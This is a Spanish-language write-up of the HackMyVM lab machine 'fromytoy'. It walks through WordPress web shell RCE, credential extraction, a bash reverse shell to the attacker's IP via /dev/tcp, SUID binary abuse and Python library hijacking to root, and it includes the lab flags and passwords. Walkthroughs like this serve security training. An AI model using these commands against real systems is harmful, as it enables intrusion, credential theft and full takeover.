# Writeup — fromytoy (HackMyVM)

**Plataforma:** HackMyVM  
**Dificultad:** Media  
**OS:** Linux (Debian)  
**IP:** 192.168.0.15  

---

## Reconocimiento

### Descubrimiento de host

```bash
sudo arp-scan -l
```

```
192.168.0.15    08:00:27:e6:ff:fb    (VirtualBox)
```

El prefijo `08:00:27` confirma que es una VM de VirtualBox.

### Escaneo de puertos

```bash
nmap -sCV -T4 -p- 192.168.0.15
```

```
22/tcp   open  ssh      OpenSSH 8.4p1 Debian
80/tcp   open  http     Apache 2.4.62
3000/tcp open  http     Apache 2.4.51 — WordPress 6.9.4 "VOCALOID NEXUS"
```

Añadimos el hostname al `/etc/hosts`:

```bash
echo "192.168.0.15 logan.hmv" | sudo tee -a /etc/hosts
```

> Nota: el hostname interno es `logan.hmv` aunque la VM se llama `fromytoy`.

---

## Enumeración

### Puerto 80

```bash
gobuster dir -u http://logan.hmv -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Solo existe `index.html` con 6 bytes — placeholder vacío.

### WordPress (puerto 3000)

```bash
wpscan --url http://logan.hmv:3000 --enumerate u,vp,vt
```

Hallazgos:

| Item | Detalle |
|---|---|
| Usuario | `admin` (confirmado) |
| XML-RPC | Habilitado |
| PHP | 7.4.27 (EOL) |
| Tema | twentytwentyone v1.4 |
| Plugin | Simple File List |

---

## Explotación — RCE via Simple File List

El plugin **Simple File List** permite subir archivos sin restricción de extensión. Encontramos shells PHP previamente subidas:

```
/wp-content/uploads/simple-file-list/shell2.php   (31B)
/wp-content/uploads/simple-file-list/dbquery.php  (217B)
/wp-content/uploads/simple-file-list/7920.php     (148B)
```

### RCE confirmado

```bash
curl "http://logan.hmv:3000/wp-content/uploads/simple-file-list/shell2.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Extracción de credenciales DB via dbquery.php

```bash
curl "http://logan.hmv:3000/wp-content/uploads/simple-file-list/dbquery.php"
```

```
admin:$P$BBJMeeHtszH5pOQZovhIZCEO2lmqTC1
```

### Variables de entorno Docker

```bash
curl "...shell2.php?cmd=env" | grep -E "WORDPRESS|DB|PASS"
```

```
WORDPRESS_DB_PASSWORD=wp_password_123
WORDPRESS_DB_USER=wp_user
WORDPRESS_DB_NAME=vocaloid_db
```

### Reverse shell

```bash
# Listener
nc -lvnp 4444

# Payload via shell2.php
curl "http://logan.hmv:3000/.../shell2.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.0.19/4444+0>%261'"
```

```
www-data@949d50994487:/var/www/html/wp-content/uploads/simple-file-list$
```

> El hostname `949d50994487` confirma que estamos dentro de un **container Docker**.

---

## Escalada de privilegios — www-data → miku

### Enumeración del container

```bash
id       # uid=33(www-data)
sudo -l  # sudo: command not found
cat /etc/passwd | grep -v nologin
```

Usuarios: `root`, `miku` (uid=1000).

### Binario SUID sospechoso

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/local/lib/.sys_log_rotator   <-- nombre inusual, path no estándar
```

```bash
file /usr/local/lib/.sys_log_rotator
ls -la /usr/local/lib/.sys_log_rotator
```

```
-rwsr-xr-x 1 miku miku 14568 Jan 20 05:04 /usr/local/lib/.sys_log_rotator
ELF 64-bit stripped
```

Analizando con `strings` descubrimos que el binario es **`rev`** (invierte líneas) con bit SUID de `miku`.

### Lectura de archivo protegido

```bash
# Archivo con permisos solo de miku
ls -la /var/www/html/wp-content/uploads/server_backup_info.txt
# -rw------- 1 miku miku
```

Usamos el binario SUID para leerlo:

```bash
/usr/local/lib/.sys_log_rotator /var/www/html/wp-content/uploads/server_backup_info.txt | rev
```

```
Backup Date: 2025-01-10
Status: Pending verification
Note for Sysadmin:
User: miku
Password: V0cal0id_M1ku_39
```

### Acceso SSH al host

```bash
ssh miku@192.168.0.15
# Password: V0cal0id_M1ku_39
```

```bash
cat ~/user.txt
# 26d1ebd4ec8c55cc69f190d0d37f6dac
```

---

## Escalada de privilegios — miku → root

### Sudo misconfiguration

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/python3 /usr/local/lib/python_scripts/cleanup_task.py
```

### Análisis del script

```python
import sys
import os
import system_utils  # <-- import relativo sin ruta absoluta

def main():
    system_utils.check_disk_space()
```

El script importa `system_utils` sin ruta absoluta — vulnerable a **Python Library Hijacking**.

### Explotación

```bash
# Crear módulo malicioso en home de miku (primer lugar en PYTHONPATH)
cat > /home/miku/system_utils.py << 'EOF'
import os
def check_disk_space():
    os.system("chmod u+s /bin/bash")
EOF

# Ejecutar con sudo
sudo /usr/bin/python3 /usr/local/lib/python_scripts/cleanup_task.py

# Escalar a root
/bin/bash -p
whoami  # root
```

### Flag de root

```bash
cat /root/root.txt
# a6c7cf996c275fa5afe6e47bc6f5c79e
```

---

## Resumen de vulnerabilidades

| Vulnerabilidad | Vector | Impacto |
|---|---|---|
| Simple File List — File Upload sin restricción | Puerto 3000 / WordPress | RCE como www-data |
| SUID binary `.sys_log_rotator` (rev) | Container | Lectura de archivos de miku |
| Credenciales en texto plano | server_backup_info.txt | Acceso SSH como miku |
| Python Library Hijacking en sudo | PYTHONPATH hijack | Escalada a root |

---

## Flags

| Flag | Hash |
|---|---|
| user.txt | `26d1ebd4ec8c55cc69f190d0d37f6dac` |
| root.txt | `a6c7cf996c275fa5afe6e47bc6f5c79e` |

---

*Writeup by Víctor (Void) — bitxodev.com*
